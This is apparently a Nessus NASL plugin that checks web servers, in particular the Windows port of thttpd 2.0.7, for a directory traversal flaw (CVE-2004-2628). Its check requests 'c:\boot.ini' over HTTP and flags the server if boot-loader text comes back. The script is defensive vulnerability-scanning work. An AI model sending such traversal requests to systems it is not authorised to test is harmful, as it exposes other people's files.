#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
# This script is released under the GNU GPLv2

if(description)
{
 script_id(14229);
 script_cve_id("CVE-2004-2628");
 script_bugtraq_id(10862);
 if (defined_func("script_xref")) {
   script_xref(name:"OSVDB", value:"8372");
 }
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "HTTP Directory Traversal (Windows)";
 name["francais"] = "Faille de thttpd";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote web server is vulnerable to a path traversal vulnerability.

An attacker may exploit this flaw to read arbitrary files on the remote
system with the privileges of the http process.

Solution : upgrade your web server or change it.
Risk factor : High";

 desc["francais"] = "Le serveur HTTP distant
permet à un pirate de lire des fichiers
arbitraires.

Solution : Mettez à jour votre server web ou changez-le.
Facteur de risque : Haut";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "thttpd flaw in 2.0.7 windows port";
 summary["francais"] = "Trou de sécurité de thttpd";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak",
		francais:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  buf = http_get(item:"c:\boot.ini", port:port);
  send(socket:soc, data:buf);
  rep = http_recv(socket:soc);
  if ( '\r\n\r\n' >< rep )
   rep = strstr(rep, '\r\n\r\n');

  if(egrep(pattern:"\[boot loader\]", string:rep))
  {
    txt  = "
The remote web server is vulnerable to a path traversal vulnerability.

An attacker may exploit this flaw to read arbitrary files on the remote
system with the privileges of the http process.

Requesting the file c:\boot.ini returns :

" + rep + "

Solution : upgrade your web server or change it.
Risk factor : High";

	security_hole(port:port, data:txt);
  }

  http_close_socket(soc);
 }
}
